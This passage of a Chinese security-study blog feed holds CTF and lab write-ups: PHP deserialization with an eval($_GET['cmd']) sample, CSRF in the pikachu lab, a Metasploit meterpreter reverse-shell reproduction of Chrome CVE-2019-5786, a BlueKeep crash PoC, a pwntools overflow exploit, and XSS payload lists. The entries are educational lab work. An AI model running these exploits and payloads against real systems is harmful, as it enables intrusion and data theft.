class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C语言脚本"> #include&lt;stdio.h&gt; <br>int main()<br>{<br>char key[] = "adsfkndcls";<br>char text[] = "killshadow";<br>int i;<br>int v3=10;//长度 <br>for (int i = 0; i &lt; 10; i++)<br>{<br>for (int j = 0; j &lt; 128; j++)<br>{<br>if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a')<br>{<br>continue;<br>}<br>if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i])<br>{<br>printf("%c",j);<br>v3++;<br>break;<br>}<br>}<br>}<br>}<br></code></pre></td></tr></tbody></table></figure><pre><code class="hljs">flag{KLDQCUDFZO}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
      <tag>Buu</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化 serialize()"></a>序列化 serialize()</h2><p>序列化：把一个对象变成可以传输的字符串。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs <?php">class S{<br>public $test="pikachu";<br>}<br>$s=new S;//创建一个对象<br>serialize($s);//把这个对象进行序列化<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p>结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}</p><p>O:代表object</p><p>1:代表对象名字长度为一个字符</p><p>S:对象的名称</p><p>1:代表对象里面有一个变量</p><p>s:数据类型</p><p>4:变量名称的长度</p><p>test:变量名称</p><p>s:数据类型</p><p>7:变量值的长度</p><p>pikachu:变量值</p><p>（什么鬼，没懂）</p><h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><pre><code class="hljs">$u=unserialize("0:1:"S":1{s:4:"test":s:7:"pikachu";}");echo $u ‐&gt; test;//得到结果为pikachu</code></pre><p>序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p><p><img src="https://s2.loli.net/2022/08/09/LkvmjC2rTAON7Pi.png" alt="image.png"></p><ul><li>常见的魔法函数：<ul><li><em>__construct()</em> 当一个对象创建时被调用</li><li><em>__destruct()</em> 当一个对象销毁时被调用</li><li><em>__toString()</em> 当一个对象被当作一个字符串使用</li><li><em>__sleep()</em> 在对象在被序列化之前运行</li><li><em>__wakeuop</em> 将在序列化之后立即被调用</li></ul></li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs <?php">//定义类<br>class test<br>{<br>//在对象被销毁时候自动调用destruct函数<br>function __destruct()<br>{<br>echo "&lt;br&gt;__destruct()&lt;br&gt;";<br>//在此函数中添加eval()以达到命令执行的目的<br>eval($_GET['cmd']);<br>}<br>}<br>//echo serialize($test);方便将序列化后的test写进u参数中传参<br>$test = new test;<br>echo serialize($test);<br>//执行完这个echo后会被垃圾回收器回收，也就是销毁<br>unserialize($_GET['u']);<br>//反序列化执行完后又会被回收<br>// 所以会出现两次destruct<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/09/obFRtxqgIyXBO9k.png" alt="image.png"></p><p>传参: <code>http://localhost/phptest.php?O:4:"test":0:{}&amp;cmd=system("woami");</code></p><p>利用成功。</p><h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p><img src="https://s2.loli.net/2022/08/09/cl6J2puye5PkzTL.png" alt="image.png"></p><p>随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的”</p><p>提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。</p><p><img src="https://s2.loli.net/2022/08/09/F58nRZDKNG4VSXi.png" alt="image.png"></p><p>将XSS字符串 <code>&lt;script&gt;alert('xss')&lt;/script&gt; </code>序列化一下： <code>O:1:"S":1:{s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";}</code></p><p>提交，成功</p><p><img src="https://s2.loli.net/2022/08/09/TVb9AHiwgLo812t.png" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>pikachu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu-CSRF</title>
    <link href="/2022/08/09/pikachu-CSRF/"/>
    <url>/2022/08/09/pikachu-CSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h2 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h2><p>1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h2 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h2><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h2 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h2><p>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p><ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul><p>2.确认凭证的有效期</p><ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul><h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png" alt="image.png"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。</p><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。</p><p>正常登录状态：</p><p><img src="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png" alt="image.png"></p><p>点击恶意url后，用户信息直接被修改</p><p><img src="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png" alt="image.png"></p><h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h1><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png" alt="image.png"></p><h1 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h1><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pikachu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="/2022/08/09/CVE-2019-5786/"/>
    <url>/2022/08/09/CVE-2019-5786/</url>
    
    <content type="html"><![CDATA[<p>前言：</p><p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p><p>win7_x86</p><p>Google_chrome_(32bit)_v72.0.3626.119</p><p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p><pre><code class="hljs">root@kali:~# msfconsole -qmsf5 &gt; search chrome_filereader</code></pre><blockquote><p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p></blockquote><p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p><p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p><h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p><ul><li><p>readyState：表示读取状态</p><ul><li>empty,0,尚未读取</li><li>loading,1,正在读取</li><li>done,2,读取完成</li></ul></li><li><p>result：表示读取结果，具体格式与读取方式有关：</p><ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><p>onprogress：回调函数</p><ul><li>读取Blob触发</li><li>当数据较多时会周期性触发多次</li></ul></li><li><p>onloadend：回调函数</p><ul><li>读取操作完成时触发，不论读取成功或失败</li></ul></li></ul><p>查看模块信息</p><p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p><p>漏洞介绍：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Payload information:<br>Description:<br>  This exploit takes advantage <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> use <span class="hljs-keyword">after</span> free vulnerability <span class="hljs-keyword">in</span> <br>  Google Chrome <span class="hljs-number">72.0</span><span class="hljs-number">.3626</span><span class="hljs-number">.119</span> running <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span> <span class="hljs-title">x86</span>. <span class="hljs-title">The</span> <br>  FileReader.readAsArrayBuffer <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">can</span> <span class="hljs-title">return</span> <span class="hljs-title">multiple</span> <span class="hljs-title">references</span> </span><br>  <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same ArrayBuffer object, which can be freed <span class="hljs-keyword">and</span> overwritten <br>  <span class="hljs-keyword">with</span> sprayed objects. The dangling ArrayBuffer reference can be used <br>  <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> sprayed objects, allowing arbitrary memory access <span class="hljs-built_in">from</span> <br>  Javascript. This is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">and</span> execute shellcode <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <br>  WebAssembly object. The shellcode is executed <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> Chrome <br>  sandbox, so you must explicitly disable <span class="hljs-keyword">the</span> sandbox <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> payload <br>  <span class="hljs-built_in">to</span> be successful.<br></code></pre></td></tr></tbody></table></figure><p>选择payload</p><pre><code class="hljs">-&gt; set payload windows/meterpreter/reverse_tcp</code></pre><blockquote><p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p></blockquote><p>设置payload参数：LHOST为kali ip</p><pre><code class="hljs">-&gt; set LHOST 192.168.119.128</code></pre><p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p><p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p><p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p><p>启动服务：run 或者exploit</p><p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p><pre><code class="hljs">-&gt; chrome.exe --no-sandbox</code></pre><p>在弹出的chome浏览器中访问kali ip: <a href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p><p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p><pre><code class="hljs">https://github.com/exodusintel/CVE-2019-5786 </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>chrome_bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="/2022/08/09/CVE-2019-0708/"/>
    <url>/2022/08/09/CVE-2019-0708/</url>
    
    <content type="html"><![CDATA[<p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p><p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p><h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p><p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p><p>工具：RDP漏洞扫描工具、MSF</p><p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p><p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p><p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p><p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p><p>启动MSF<br>查找漏洞： <code>search 0708</code></p><p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p><p>查看参数： <code>show options</code></p><p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p><p>运行：<code>run</code></p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p><p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p><p>攻击成功，win7变为蓝屏。</p><p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p><ul><li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li><li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li><li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li><li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li><li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li></ul><p>连接过程说明：</p><ul><li>客户端连接服务器</li><li>ISO数据层建立连接</li><li>发送初始协议相关信息，接收加密、解密秘钥</li><li>虚拟通道申请</li><li>加密形式发送客户端系统信息，同时验证加密协议</li><li>平台软件证书验证</li><li>各功能建立连接，各功能数据传输，功能实现。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>windows漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn-反应釜开关控制</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p><ul><li>可以修改GOT表</li><li>可以通过一处的方式来更改程序运行流</li><li>堆栈不可执行</li><li>地址随机化未开启</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p><p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p><p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p><p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p><p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有关XSS跨站脚本</title>
    <link href="/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    <url>/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p><p>XSS攻击针对的是用户层面的攻击.</p><ul><li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li><li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li><li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li></ul><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p><p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p><p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p><p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p><h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul><li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li></ul><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs <script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie<br></code></pre></td></tr></tbody></table></figure><ul><li><code>&lt;img&gt;</code>：<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert("hack")&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">"javascript:alert("</span>XSS");"&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br></code></pre></td></tr></tbody></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-dice_game</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p><p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] 